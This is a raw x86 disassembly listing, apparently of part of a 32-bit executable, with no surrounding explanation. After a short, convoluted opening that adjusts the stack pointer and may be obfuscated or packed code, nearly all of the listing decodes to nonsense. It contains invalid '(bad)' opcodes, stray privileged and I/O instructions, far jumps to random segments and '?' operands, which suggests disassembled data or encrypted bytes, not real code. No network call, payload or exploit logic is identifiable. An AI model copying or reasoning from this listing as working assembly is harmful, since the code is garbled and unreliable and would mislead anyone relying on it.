  40bea0:	call   DWORD PTR [ebx]
  40bea2:	cmp    DWORD PTR [ebp+0x10],esi
  40bea5:	je     0x40e267
  40beab:	xchg   edx,eax
  40beac:	push   0xb
  40beae:	pop    ecx
  40beaf:	push   0x4
  40beb1:	pop    ebx
  40beb2:	inc    ebx
  40beb3:	xchg   ebx,ecx
  40beb5:	sub    ebx,ecx
  40beb7:	xchg   ebx,ecx
  40beb9:	dec    ecx
  40beba:	dec    ecx
  40bebb:	mov    eax,DWORD PTR [ebp-0x1c]
  40bebe:	imul   eax,ecx
  40bec1:	add    esp,eax
  40bec3:	jmp    0x40e266
  40bec8:	xchg   esi,eax
  40bec9:	cli    
  40beca:	test   DWORD PTR [esi],0xca9373f3
  40bed0:	jae    0x40beb5
  40bed2:	adc    eax,0xea3d196
  40bed7:	dec    esp
  40bed8:	mov    ah,0xe1
  40beda:	jb     0x40bf4e
  40bedc:	clc    
  40bedd:	pop    edi
  40bede:	jb     0x40bf52
  40bee0:	hlt    
  40bee1:	mov    ds:0x4e3d258,eax
  40bee6:	push   ecx
  40bee7:	or     cl,dh
  40bee9:	jp     0x40bf06
  40beeb:	mov    edi,0x9cdf5aaf
  40bef0:	int    0x6f
  40bef2:	call   0xdf638dc
  40bef7:	sbb    edx,DWORD PTR [edi]
  40bef9:	cmc    
  40befa:	test   BYTE PTR [ebx+0x25ff6d00],0x9d
  40bf01:	imul   esp,ebx,0xffffff93
  40bf04:	test   DWORD PTR [edi-0xaae2842],edi
  40bf0a:	scas   eax,DWORD PTR es:[edi]
  40bf0b:	push   esi
  40bf0c:	adc    DWORD PTR [esi],edx
  40bf0e:	add    BYTE PTR [ebx+eiz*4-0x7b],dl
  40bf12:	inc    edi
  40bf13:	pop    esp
  40bf14:	add    DWORD PTR [edi+esi*4+0x71d17a4b],0x95106901
  40bf1f:	mov    cl,0x62
  40bf21:	mov    WORD PTR [ebx+0x2896d4c3],gs
  40bf27:	jns    0x40becd
  40bf29:	inc    esi
  40bf2a:	addr16 loope 0x40bf11
  40bf2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf2e:	xor    BYTE PTR [edx+0x3c],bh
  40bf31:	das    
  40bf32:	push   ebp
  40bf33:	gs stc 
  40bf35:	data16 cld 
  40bf37:	mov    BYTE PTR [edx-0x56965b74],cl
  40bf3d:	add    al,BYTE PTR [ebx+0x3a2b1848]
  40bf43:	icebp  
  40bf44:	or     DWORD PTR ss:[ebx-0x4deb80c8],0xffffffb5
  40bf4c:	daa    
  40bf4d:	mov    eax,0xfb3dcca1
  40bf52:	xor    dh,BYTE PTR [ebx-0x78]
  40bf55:	push   ds
  40bf56:	sub    eax,0xb640ee9a
  40bf5b:	adc    bh,BYTE PTR [edi]
  40bf5d:	and    ebx,DWORD PTR [edi]
  40bf5f:	dec    eax
  40bf60:	cwde   
  40bf61:	push   esp
  40bf62:	fwait
  40bf63:	test   eax,0xd5e96c95
  40bf68:	pop    ebp
  40bf69:	stos   DWORD PTR es:[edi],eax
  40bf6a:	icebp  
  40bf6b:	sbb    DWORD PTR [esi-0x25e4312c],esp
  40bf71:	inc    edx
  40bf72:	aaa    
  40bf73:	jno    0x40bfa9
  40bf75:	mov    esi,0x3ac69ddd
  40bf7a:	mov    al,ds:0xc491f22e
  40bf7f:	lahf   
  40bf80:	adc    DWORD PTR [ecx+0x64],ebp
  40bf83:	sub    al,0x3f
  40bf85:	shl    DWORD PTR [eax-0x6083ac10],0x9c
  40bf8c:	inc    ebp
  40bf8d:	jns    0x40bffd
  40bf8f:	adc    DWORD PTR [esi+0x26afa355],ebx
  40bf95:	mov    esi,0xeaf36164
  40bf9a:	adc    BYTE PTR [edi-0x3c7d58b0],al
  40bfa0:	sar    BYTE PTR [ebx+0x6c],cl
  40bfa3:	and    DWORD PTR [edi+eax*8+0x2b9c81fe],0x207cc6fa
  40bfae:	add    eax,0xa73e22b6
  40bfb3:	call   0x2e62:0xef26853d
  40bfba:	sti    
  40bfbb:	sbb    al,0x56
  40bfbd:	aaa    
  40bfbe:	sub    bl,dl
  40bfc0:	xlat   BYTE PTR ds:[ebx]
  40bfc1:	pusha  
  40bfc2:	xchg   edx,eax
  40bfc3:	cs inc ch
  40bfc6:	dec    ebp
  40bfc7:	add    ebp,DWORD PTR [ebx]
  40bfc9:	push   eax
  40bfca:	outs   dx,BYTE PTR ds:[esi]
  40bfcb:	push   esi
  40bfcc:	mov    ecx,0x74e2f51d
  40bfd1:	cs cdq 
  40bfd3:	xor    eax,0xa4cb7117
  40bfd8:	enter  0x5d38,0xff
  40bfdc:	xor    eax,0x3ba1638e
  40bfe1:	xchg   edi,eax
  40bfe2:	xchg   ecx,eax
  40bfe3:	pop    ss
  40bfe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe5:	jo     0x40bfda
  40bfe7:	xchg   edx,eax
  40bfe8:	xchg   ecx,eax
  40bfe9:	xor    edx,ebp
  40bfeb:	adc    ch,BYTE PTR [ebp+ebx*1+0x4e]
  40bfef:	adc    al,0x42
  40bff1:	lds    ebx,FWORD PTR [ebp+0x680686e6]
  40bff7:	aam    0x65
  40bff9:	jbe    0x40c058
  40bffb:	shl    DWORD PTR [edi-0x2e],0x3f
  40bfff:	fdiv   DWORD PTR [esi]
  40c001:	jnp    0x40c01b
  40c003:	or     eax,0x18aafb45
  40c008:	mov    edi,0x44a867b0
  40c00d:	data16 fist DWORD PTR [eax-0x78]
  40c011:	imul   DWORD PTR [ebp+0x70]
  40c014:	mov    ebp,0x5e344f74
  40c019:	adc    al,0x50
  40c01b:	or     edi,DWORD PTR [ebp+0x55]
  40c01e:	into   
  40c01f:	hlt    
  40c020:	sub    eax,0x7508b4e9
  40c025:	jno    0x40c02f
  40c027:	pop    esp
  40c028:	rol    BYTE PTR [ebp+0x367385e4],0xc8
  40c02f:	mov    ecx,0x940dcb14
  40c034:	dec    edi
  40c035:	inc    ecx
  40c036:	sar    ebx,0xfa
  40c039:	hlt    
  40c03a:	jmp    0x43c2:0xa5d77cc1
  40c041:	mov    ebx,DWORD PTR [esi+0x37]
  40c044:	or     edx,DWORD PTR ds:0x2a2320d6
  40c04a:	cmp    DWORD PTR [ebp+0x4c],0xbce960ce
  40c051:	jb     0x40c085
  40c053:	or     DWORD PTR [eax],ebp
  40c055:	push   ebp
  40c056:	and    ecx,0x57
  40c059:	test   eax,0xe6a6f0ed
  40c05e:	ja     0x40c092
  40c060:	fcomp  DWORD PTR ds:0x89686abe
  40c066:	bound  esp,QWORD PTR [ebx]
  40c068:	in     eax,0x6
  40c06a:	mov    ebp,0xb6ff58c5
  40c070:	test   al,0x64
  40c072:	jns    0x40c014
  40c074:	dec    ebx
  40c075:	push   edi
  40c076:	pop    ebp
  40c077:	or     eax,0x8db43bb
  40c07c:	mov    al,ds:0x7003c34b
  40c081:	xchg   esp,eax
  40c082:	repz mov ecx,ecx
  40c085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c086:	inc    esp
  40c087:	call   0xd3f9:0xec64deb7
  40c08e:	out    0x88,eax
  40c090:	xlat   BYTE PTR ds:[ebx]
  40c091:	mov    WORD PTR [eax+0x67],?
  40c094:	(bad)  
  40c096:	imul   eax,DWORD PTR [eax],0x4a
  40c099:	ret    
  40c09a:	mov    dl,0x4e
  40c09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c09d:	int    0x65
  40c09f:	jnp    0x40c106
  40c0a1:	lahf   
  40c0a2:	mov    ecx,0x8bda3de0
  40c0a7:	or     dl,bh
  40c0a9:	mov    ds:0xfec60764,eax
  40c0ae:	je     0x40c0d0
  40c0b0:	sub    eax,0xff55ced9
  40c0b5:	pop    ebp
  40c0b6:	jb     0x40c119
  40c0b8:	in     eax,0x80
  40c0ba:	adc    al,0x74
  40c0bc:	xor    al,0xa0
  40c0be:	push   0x27
  40c0c0:	daa    
  40c0c1:	adc    ebp,esi
  40c0c3:	pop    ebp
  40c0c4:	push   ss
  40c0c5:	mov    WORD PTR [edi],gs
  40c0c7:	dec    edx
  40c0c8:	push   esi
  40c0c9:	dec    eax
  40c0ca:	jecxz  0x40c095
  40c0cc:	xor    cl,0x46
  40c0cf:	(bad)  
  40c0d0:	xchg   ecx,eax
  40c0d1:	inc    ecx
  40c0d2:	mov    esp,0x9d7532ac
  40c0d7:	in     eax,0x28
  40c0d9:	pop    edx
  40c0da:	inc    edi
  40c0db:	sbb    BYTE PTR [esi+0x7],bh
  40c0de:	dec    esi
  40c0df:	retf   
  40c0e0:	scas   eax,DWORD PTR es:[edi]
  40c0e1:	sub    ah,ah
  40c0e3:	lods   al,BYTE PTR ds:[esi]
  40c0e4:	popf   
  40c0e5:	jb     0x40c166
  40c0e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0e8:	push   0x4c
  40c0ea:	std    
  40c0eb:	shr    DWORD PTR [esi+0xd],cl
  40c0ee:	mov    edi,DWORD PTR [edi-0x4e]
  40c0f1:	jno    0x40c0d9
  40c0f3:	dec    esi
  40c0f4:	gs test eax,0xdffc59f9
  40c0fa:	rol    BYTE PTR [ebx+0x1b],1
  40c0fd:	xor    ch,al
  40c0ff:	mov    ecx,0xe4374272
  40c104:	mov    edi,0x49f5468f
  40c109:	not    DWORD PTR [esi+0x50f88857]
  40c10f:	jb     0x40c15e
  40c111:	mov    edx,0xba687a27
  40c116:	sbb    BYTE PTR [edx-0x598174ad],dh
  40c11c:	push   es
  40c11d:	popa   
  40c11e:	stos   DWORD PTR es:[edi],eax
  40c11f:	into   
  40c120:	jmp    0x228b:0x65501f40
  40c127:	xchg   DWORD PTR [edx-0x43c9eff6],ebx
  40c12d:	mov    eax,ds:0xc447e5dc
  40c132:	jnp    0x40c152
  40c134:	in     eax,dx
  40c135:	ja     0x40c13e
  40c137:	cmp    DWORD PTR [ebx+0x11],ebp
  40c13a:	pop    esi
  40c13b:	sub    al,ah
  40c13d:	lods   al,BYTE PTR ds:[esi]
  40c13e:	scas   al,BYTE PTR es:[edi]
  40c13f:	cmp    cl,BYTE PTR ds:[esi+0xdb71a3c]
  40c146:	xchg   DWORD PTR [ecx+0x4b312b98],eax
  40c14c:	nop
  40c14d:	mov    DWORD PTR [ecx-0x53],0xc4c97f3d
  40c154:	(bad)  
  40c155:	xor    DWORD PTR [esi+0x3d83d6f5],ebp
  40c15b:	rol    BYTE PTR [eax-0x36],1
  40c15e:	ins    DWORD PTR es:[edi],dx
  40c15f:	mov    dh,0x49
  40c161:	pop    ds
  40c162:	les    esp,FWORD PTR [edx-0x56323d26]
  40c168:	pop    es
  40c169:	in     al,0xfc
  40c16b:	adc    eax,0xa1adabec
  40c170:	adc    al,0x1b
  40c172:	mov    ecx,0x211392b9
  40c177:	jae    0x40c107
  40c179:	(bad)  
  40c17a:	fidivr WORD PTR [edx+0x6b93375b]
  40c180:	push   edx
  40c181:	ss jb  0x40c164
  40c184:	push   esp
  40c185:	adc    al,0x7f
  40c187:	fmul   DWORD PTR [edx]
  40c189:	icebp  
  40c18a:	lea    ebx,[ebx+0x78]
  40c18d:	xor    al,0xf7
  40c18f:	jp     0x40c20c
  40c191:	xchg   BYTE PTR [esi],dl
  40c193:	les    esp,FWORD PTR [ecx]
  40c195:	sti    
  40c196:	test   al,0xec
  40c198:	inc    edi
  40c199:	push   edx
  40c19a:	xlat   BYTE PTR ds:[ebx]
  40c19b:	out    0xbd,al
  40c19d:	aaa    
  40c19e:	lock fdivp st(7),st
  40c1a1:	ss stos BYTE PTR es:[edi],al
  40c1a3:	xor    bh,0xf1
  40c1a6:	sahf   
  40c1a7:	inc    ebp
  40c1a8:	cvttps2pi mm5,xmm2
  40c1ab:	popa   
  40c1ac:	pop    esp
  40c1ad:	push   ecx
  40c1ae:	aam    0xb9
  40c1b0:	in     al,dx
  40c1b1:	dec    esi
  40c1b2:	ret    
  40c1b3:	popf   
  40c1b4:	or     esi,DWORD PTR [si]
  40c1b7:	das    
  40c1b8:	adc    bl,BYTE PTR [edx]
  40c1ba:	mov    al,ds:0xeb25d2fb
  40c1bf:	mov    esi,0xd4dcb8e2
  40c1c4:	test   BYTE PTR [edi],dl
  40c1c6:	mov    ah,0x7a
  40c1c8:	sbb    DWORD PTR [edx],edx
  40c1ca:	(bad)  
  40c1cb:	and    al,0x43
  40c1cd:	ins    DWORD PTR es:[edi],dx
  40c1ce:	fcom   QWORD PTR [eax+0x2243f739]
  40c1d4:	or     ch,0x81
  40c1d7:	fld    st(2)
  40c1d9:	mov    dl,0x60
  40c1db:	push   esi
  40c1dc:	stos   DWORD PTR es:[edi],eax
  40c1dd:	mov    ah,0x75
  40c1df:	cmc    
  40c1e0:	jmp    0x40c187
  40c1e2:	out    dx,al
  40c1e3:	adc    eax,0x1993eb57
  40c1e8:	out    0xeb,al
  40c1ea:	cdq    
  40c1eb:	sbb    ah,BYTE PTR [eax+0x1cf1fea2]
  40c1f1:	adc    eax,0xe0c1cd04
  40c1f6:	sar    BYTE PTR [edx-0x2befa6c8],1
  40c1fc:	jle    0x40c1d3
  40c1fe:	call   0xc8907a4c
  40c203:	cmp    al,0xb9
  40c205:	dec    ebp
  40c206:	pop    eax
  40c207:	and    DWORD PTR [esi-0x5948548],0x5d
  40c20e:	ja     0x40c26e
  40c210:	dec    eax
  40c211:	mov    al,0xd1
  40c213:	lds    edx,FWORD PTR [eax]
  40c215:	sbb    eax,0xb165eb80
  40c21b:	jp     0x40c268
  40c21d:	in     eax,dx
  40c21e:	stos   DWORD PTR es:[edi],eax
  40c21f:	nop
  40c220:	jp     0x40c1a7
  40c222:	mov    al,BYTE PTR [ebp-0x75]
  40c225:	repz icebp 
  40c227:	mov    ch,0x9d
  40c229:	(bad)
  40c22c:	popa   
  40c22d:	fdivr  DWORD PTR ds:0xb11ba3cb
  40c233:	dec    ebx
  40c234:	in     eax,dx
  40c235:	(bad)  
  40c236:	jmp    0x40c1c1
  40c238:	sbb    al,0x89
  40c23a:	outs   dx,BYTE PTR ds:[esi]
  40c23b:	int    0x97
  40c23d:	aam    0x40
  40c23f:	out    0x41,eax
  40c241:	test   BYTE PTR [edx-0xeb99e2d],dl
  40c247:	mov    dl,0xec
  40c249:	outs   dx,DWORD PTR ds:[esi]
  40c24a:	sub    edx,DWORD PTR [ecx-0x4c]
  40c24d:	shl    bh,1
  40c24f:	push   edx
  40c250:	std    
  40c251:	stc    
  40c252:	mov    al,0x3e
  40c254:	in     eax,0x73
  40c256:	enter  0x6049,0x9b
  40c25a:	rcr    BYTE PTR [ebx+edx*4+0x5995adc5],0x21
  40c262:	rcl    BYTE PTR [edx],1
  40c264:	xchg   edi,eax
  40c265:	(bad)  
  40c266:	int    0xd7
  40c268:	pop    es
  40c269:	pop    es
  40c26a:	dec    ecx
  40c26b:	mov    BYTE PTR [esi+0x7b],ch
  40c26e:	call   0x9276:0x29ae3867
  40c275:	inc    ebp
  40c276:	sub    esi,DWORD PTR [ebx-0x2e997728]
  40c27c:	cld    
  40c27d:	inc    edi
  40c27e:	stos   BYTE PTR es:[edi],al
  40c27f:	or     ebx,0xe46c105
  40c285:	mov    esi,0x73353e26
  40c28b:	(bad)  
  40c28c:	mov    ch,0xc6
  40c28e:	js     0x40c2ed
  40c290:	and    BYTE PTR [ebp+edx*2+0x32936a55],dl
  40c297:	sub    eax,0x499f33b
  40c29c:	neg    BYTE PTR [edi]
  40c29e:	and    bh,cl
  40c2a0:	or     DWORD PTR ds:0xfd196f4f,edx
  40c2a6:	dec    edi
  40c2a7:	and    esi,0xffffffe7
  40c2aa:	mov    ds:0x94109253,eax
  40c2af:	or     eax,0x7c537f05
  40c2b4:	xlat   BYTE PTR ds:[ebx]
  40c2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2b6:	and    eax,DWORD PTR [ecx-0x7afef017]
  40c2bc:	clc    
  40c2bd:	xor    eax,DWORD PTR [ebp+0x4d36f3db]
  40c2c3:	push   cs
  40c2c4:	call   0x1e2d:0x74e958eb
  40c2cb:	ss fwait
  40c2cd:	jno    0x40c291
  40c2cf:	mov    al,ds:0xadf80bb3
  40c2d4:	into   
  40c2d5:	fild   WORD PTR [ebp+0x5b]
  40c2d8:	dec    ecx
  40c2d9:	fistp  WORD PTR [eax-0x63]
  40c2dc:	jmp    0xd024:0x50b859a2
  40c2e3:	sub    esp,0x6c
  40c2e6:	cmp    al,0x60
  40c2e8:	xor    BYTE PTR [edi],dh
  40c2ea:	fnstcw WORD PTR [edi]
  40c2ec:	bound  ebx,QWORD PTR [edi-0xb0d65e9]
  40c2f2:	cs loopne 0x40c327
  40c2f5:	or     al,0xc
  40c2f7:	idiv   BYTE PTR ds:0x37c9bcce
  40c2fd:	aas    
  40c2fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ff:	arpl   ax,bx
  40c301:	pop    es
  40c302:	pop    es
  40c303:	dec    esp
  40c304:	jle    0x40c29b
  40c306:	lds    esi,FWORD PTR [eax-0x5e10bdd0]
  40c30c:	iret   
  40c30d:	mov    ds:0xce59fc51,eax
  40c312:	std    
  40c313:	mov    esi,?
  40c315:	jecxz  0x40c359
  40c317:	div    BYTE PTR [ebp*1+0x582b2486]
  40c31e:	sbb    ah,ah
  40c320:	dec    esp
  40c321:	inc    eax
  40c322:	loop   0x40c360
  40c324:	call   FWORD PTR ds:0x9fd3dafe
  40c32a:	outs   dx,DWORD PTR ds:[esi]
  40c32b:	popf   
  40c32c:	int3   
  40c32d:	mov    dh,0x86
  40c32f:	mov    ?,WORD PTR [edi-0x29]
  40c332:	pop    esp
  40c333:	bound  eax,QWORD PTR [ebx-0x78]
  40c336:	test   DWORD PTR [ecx+0x26],0xd642d926
  40c33d:	inc    esi
  40c33e:	mov    ecx,0xc9cef0c
  40c343:	test   ecx,esp
  40c345:	fsub   DWORD PTR [ecx+0x5f]
  40c348:	pop    es
  40c349:	and    eax,0x4b1ed247
  40c34e:	rcl    BYTE PTR [edx+0x73612479],1
  40c354:	mov    ds,WORD PTR [esi]
  40c356:	cdq    
  40c357:	loopne 0x40c2ec
  40c359:	or     eax,eax
  40c35b:	std    
  40c35c:	mov    ecx,0xbdcba5e3
  40c361:	inc    esi
  40c362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c363:	jnp    0x40c2f3
  40c365:	jp     0x40c398
  40c367:	out    0x65,al
  40c369:	pop    ss
  40c36a:	jle    0x40c332
  40c36c:	out    dx,al
  40c36d:	inc    edx
  40c36e:	dec    esp
  40c36f:	cmp    dh,bh
  40c371:	mov    bh,0x96
  40c373:	in     al,0x65
  40c375:	sbb    ch,BYTE PTR [ebx+edx*1+0x6df0e9b1]
  40c37c:	cmp    dh,BYTE PTR [ebp+0x174c62d8]
  40c382:	fsub   QWORD PTR [esi+0xfdeea80]
  40c388:	jge    0x40c3c2
  40c38a:	cmp    esi,ecx
  40c38c:	xlat   BYTE PTR ds:[ebx]
  40c38d:	cmp    esi,DWORD PTR [esi+0x46fc4ed5]
  40c393:	inc    esi
  40c394:	(bad)  
  40c395:	cli    
  40c396:	icebp  
  40c397:	xlat   BYTE PTR ds:[ebx]
  40c398:	jle    0x40c3d7
  40c39a:	dec    eax
  40c39b:	jecxz  0x40c374
  40c39d:	addr16 xchg esi,eax
  40c39f:	cmc    
  40c3a0:	cmp    eax,DWORD PTR [edx-0x44]
  40c3a3:	leave  
  40c3a4:	jmp    0x221f:0xf1241a3a
  40c3ab:	sub    DWORD PTR [edi+0x2a7a6842],esp
  40c3b1:	xchg   BYTE PTR ds:0x167e7df5,ch
  40c3b7:	pop    ds
  40c3b8:	je     0x40c3e4
  40c3ba:	fwait
  40c3bb:	leave  
  40c3bc:	les    eax,FWORD PTR [edx-0x6a9f3439]
  40c3c2:	ret    
  40c3c3:	or     al,0x6c
  40c3c5:	and    cl,BYTE PTR [ebx-0x225e4f18]
  40c3cb:	shl    DWORD PTR [ebp+0x7a7d3edc],0xaa
  40c3d2:	cli    
  40c3d3:	int3   
  40c3d4:	in     eax,0x48
  40c3d6:	es mov bh,0xdb
  40c3d9:	push   es
  40c3da:	dec    esp
  40c3db:	jp     0x40c378
  40c3dd:	popa   
  40c3de:	mov    bh,0xd7
  40c3e0:	shr    ch,1
  40c3e2:	aad    0x8a
  40c3e4:	arpl   WORD PTR [eax+ebp*2-0x75],di
  40c3e8:	xchg   ebp,eax
  40c3e9:	xchg   ecx,eax
  40c3ea:	ja     0x40c3cd
  40c3ec:	stc    
  40c3ed:	add    esp,DWORD PTR [ebx-0x468f15f3]
  40c3f3:	pop    esi
  40c3f4:	adc    esp,DWORD PTR [ebx-0x2a]
  40c3f7:	loope  0x40c386
  40c3f9:	fs push ebp
  40c3fb:	xor    ah,BYTE PTR [ecx+eax*4-0x7b]
  40c3ff:	aaa    
  40c400:	pop    ss
  40c401:	mov    ds:0x222647d4,eax
  40c406:	jo     0x40c3c3
  40c408:	test   eax,0x7c392826
  40c40d:	cmp    bh,BYTE PTR [edi]
  40c40f:	popa   
  40c410:	shr    ecx,cl
  40c412:	lahf   
  40c413:	cmp    eax,0xbacd8d
  40c418:	adc    al,0xb6
  40c41b:	push   es
  40c41c:	lahf   
  40c41d:	mov    edx,DWORD PTR [ebx+0x2c3306e8]
  40c423:	mov    al,BYTE PTR [edx-0x6e]
  40c426:	mov    ebx,0x3897e7ac
  40c42b:	fs dec ecx
  40c42d:	sub    bh,BYTE PTR ds:0x6ea43f0e
  40c433:	push   eax
  40c434:	cld    
  40c435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c436:	dec    eax
  40c437:	pop    edx
  40c438:	shl    DWORD PTR [esi+0x4c],cl
  40c43b:	sbb    DWORD PTR [ecx+ebp*4],esp
  40c43e:	retf   
  40c43f:	pop    ebp
  40c440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c441:	inc    ebx
  40c442:	mov    eax,ds:0x3c80c311
  40c447:	test   BYTE PTR [bx+di+0x23b6],dl
  40c44c:	mov    BYTE PTR [edi-0x7e8db73b],dl
  40c452:	xchg   ecx,eax
  40c453:	mov    dh,0x1
  40c455:	repz jmp 0x40c4a7
  40c458:	inc    esi
  40c459:	pop    edx
  40c45a:	pop    esp
  40c45b:	hlt    
  40c45c:	dec    eax
  40c45d:	fnstcw WORD PTR [eax-0x11]
  40c460:	and    BYTE PTR [ebx-0x13],cl
  40c463:	dec    edx
  40c464:	(bad)  
  40c465:	lods   eax,DWORD PTR ds:[esi]
  40c466:	int3   
  40c467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c468:	mov    bl,0xbe
  40c46a:	sub    al,0x8a
  40c46c:	(bad)  
  40c46d:	pop    edx
  40c46e:	into   
  40c46f:	aam    0x78
  40c471:	out    dx,al
  40c472:	dec    ebx
  40c473:	inc    esi
  40c474:	ret    0x991e
  40c477:	imul   ebx,edx,0x41
  40c47a:	rol    DWORD PTR [eax],1
  40c47c:	in     al,dx
  40c47d:	in     al,0xe6
  40c47f:	int    0x5a
  40c481:	sub    al,0x2b
  40c483:	mov    dl,0x40
  40c485:	or     edx,0x68f1eb1e
  40c48b:	sbb    DWORD PTR [edi],ebx
  40c48d:	sbb    ah,BYTE PTR [edx-0x2ec57501]
  40c493:	rcr    BYTE PTR [ecx-0x217daade],cl
  40c499:	or     ecx,DWORD PTR [ebp+esi*1+0xe8a78]
  40c4a0:	xchg   ecx,eax
  40c4a1:	sub    BYTE PTR [esi-0x61],ch
  40c4a4:	outs   dx,DWORD PTR ds:[esi]
  40c4a5:	repnz cmp edi,DWORD PTR [ebx]
  40c4a8:	adc    al,0xe1
  40c4aa:	lods   eax,DWORD PTR ds:[esi]
  40c4ab:	test   BYTE PTR [edi+0x7a833aa9],al
  40c4b1:	ror    DWORD PTR [ebx+0x7b],0x25
  40c4b5:	(bad)
  40c4b8:	repz mov WORD PTR [ecx-0x2a],gs
  40c4bc:	dec    esi
  40c4bd:	cwde   
  40c4be:	dec    esi
  40c4bf:	and    eax,0x8a8a2480
  40c4c4:	pop    ebx
  40c4c5:	dec    ecx
  40c4c6:	xchg   esi,eax
  40c4c7:	fwait
  40c4c8:	xor    bh,ch
  40c4ca:	jno    0x40c526
  40c4cc:	test   eax,0xc39bfd7e
  40c4d1:	into   
  40c4d2:	jmp    0x559a0802
  40c4d7:	cmp    al,0x30
  40c4d9:	jo     0x40c4e7
  40c4db:	cmp    eax,0x8c7b22de
  40c4e0:	mov    eax,ds:0xac6e0ca
  40c4e5:	lods   al,BYTE PTR ds:[esi]
  40c4e6:	jae    0x40c482
  40c4e8:	sbb    dl,dl
  40c4ea:	adc    al,BYTE PTR [eax-0x52]
  40c4ed:	push   ecx
  40c4ee:	test   DWORD PTR [esi+0x46],0x666f5afe
  40c4f5:	add    DWORD PTR [ecx+ecx*8-0x6edb83b6],edi
  40c4fc:	inc    edi
  40c4fd:	pop    ds
  40c4fe:	dec    edx
  40c4ff:	or     eax,0x1821e23f
  40c504:	mov    ds:0x457751e2,al
  40c509:	sbb    DWORD PTR [ebx],esi
  40c50b:	xor    BYTE PTR [ebx-0x54],0xdc
  40c50f:	or     eax,0xcd12386b
  40c514:	jnp    0x40c4f4
  40c516:	hlt    
  40c517:	sbb    al,0xf
  40c519:	std    
  40c51a:	xor    eax,0xab0b641d
  40c51f:	sbb    DWORD PTR [ecx+0x67],ebp
  40c522:	lock mov esp,0xc3b27145
  40c528:	hlt    
  40c529:	and    al,0xaf
  40c52b:	div    DWORD PTR [ebx-0x4e]
  40c52e:	xchg   ecx,eax
  40c52f:	test   al,dl
  40c531:	mov    cs,WORD PTR [edx-0x60]
  40c534:	adc    ecx,DWORD PTR [esi]
  40c536:	mov    esi,0x3a242e6a
  40c53b:	in     al,dx
  40c53c:	mov    esi,0xe5cb3ba1
  40c541:	xor    DWORD PTR [edi+0x46],ebx
  40c544:	mov    ch,BYTE PTR [esi+0x3a]
  40c547:	sub    eax,0x42f32b1a
  40c54c:	xor    bl,BYTE PTR [ebp+0x3f]
  40c54f:	and    BYTE PTR [eax-0x6b],0xb7
  40c553:	xor    eax,0xc9678e68
  40c558:	aas    
  40c559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c55a:	data16 arpl WORD PTR [eax+0x4f],bp
  40c55e:	das    
  40c55f:	fist   WORD PTR [edx]
  40c561:	(bad)  
  40c562:	mov    dl,0xb7
  40c564:	mov    bl,0xb1
  40c566:	jge    0x40c510
  40c568:	jg     0x40c562
  40c56a:	loopne 0x40c5a0
  40c56c:	push   ds
  40c56d:	jecxz  0x40c5e7
  40c56f:	fild   WORD PTR [eax+0x47]
  40c572:	push   esp
  40c573:	ucomiss xmm3,DWORD PTR [ebx-0x1d]
  40c577:	ins    BYTE PTR es:[edi],dx
  40c578:	iret   
  40c579:	repnz pop es
  40c57b:	lds    esi,FWORD PTR [esi+0x56eedd24]
  40c581:	fnstcw WORD PTR [edi]
  40c583:	es inc ebx
  40c585:	nop
  40c586:	or     al,0x7e
  40c588:	scas   al,BYTE PTR es:[edi]
  40c589:	push   ecx
  40c58a:	mov    edi,0x9a36cf42
  40c58f:	cmp    DWORD PTR [ecx],0xa41643de
  40c595:	sbb    edi,DWORD PTR [ebp-0x1fe22d21]
  40c59b:	rol    BYTE PTR [ebp-0x50],cl
  40c59e:	dec    esp
  40c59f:	add    eax,0x2fefed78
  40c5a4:	jo     0x40c587
  40c5a6:	popf   
  40c5a7:	xchg   ebx,eax
  40c5a8:	icebp  
  40c5a9:	aam    0x9e
  40c5ab:	pop    ss
  40c5ac:	scas   eax,DWORD PTR es:[edi]
  40c5ad:	ins    BYTE PTR es:[edi],dx
  40c5ae:	add    BYTE PTR [ebx],ah
  40c5b0:	scas   al,BYTE PTR es:[edi]
  40c5b1:	js     0x40c542
  40c5b3:	psrlw  mm2,QWORD PTR [edi-0x4e40f450]
  40c5ba:	cli    
  40c5bb:	ins    DWORD PTR es:[edi],dx
  40c5bc:	jp     0x40c589
  40c5be:	jl     0x40c5f4
  40c5c0:	mov    esi,0x37339c3d
  40c5c5:	pop    esp
  40c5c6:	dec    ebx
  40c5c7:	sti    
  40c5c8:	fiadd  DWORD PTR [edi]
  40c5ca:	pop    es
  40c5cb:	push   es
  40c5cc:	ss scas al,BYTE PTR es:[edi]
  40c5ce:	nop
  40c5cf:	ins    BYTE PTR es:[edi],dx
  40c5d0:	add    DWORD PTR [ebx-0x55b679f2],0xc51903d6
  40c5da:	mov    ds:0xa6de04f,eax
  40c5df:	dec    eax
  40c5e0:	popf   
  40c5e1:	daa    
  40c5e2:	and    bh,bh
  40c5e4:	cs jne 0x40c60b
  40c5e7:	leave  
  40c5e8:	adc    eax,0x994ff492
  40c5ed:	(bad)  
  40c5ef:	jge    0x40c645
  40c5f1:	test   DWORD PTR [edi],edi
  40c5f3:	xor    BYTE PTR [esi],al
  40c5f5:	shl    DWORD PTR [esi],0x96
  40c5f8:	bound  eax,QWORD PTR [ebp-0x2d]
  40c5fb:	retf   
  40c5fc:	mov    edi,0xd8941c17
  40c601:	fwait
  40c602:	aaa    
  40c603:	mov    ebx,0xdafd9976
  40c608:	pop    es
  40c609:	into   
  40c60a:	out    0x23,al
  40c60c:	pop    ss
  40c60d:	add    esp,DWORD PTR [eax-0x59e23590]
  40c613:	xchg   ebx,eax
  40c614:	sbb    dh,al
  40c616:	inc    ecx
  40c617:	out    dx,eax
  40c618:	mul    DWORD PTR [edx]
  40c61a:	fnstenv [ecx]
  40c61c:	sub    ah,BYTE PTR [eax-0xe]
  40c61f:	inc    edi
  40c620:	xor    ebp,DWORD PTR ss:[edx-0x32]
  40c624:	mov    dh,0xdf
  40c626:	fdivr  DWORD PTR [ecx-0x3c]
  40c629:	jno    0x40c5f9
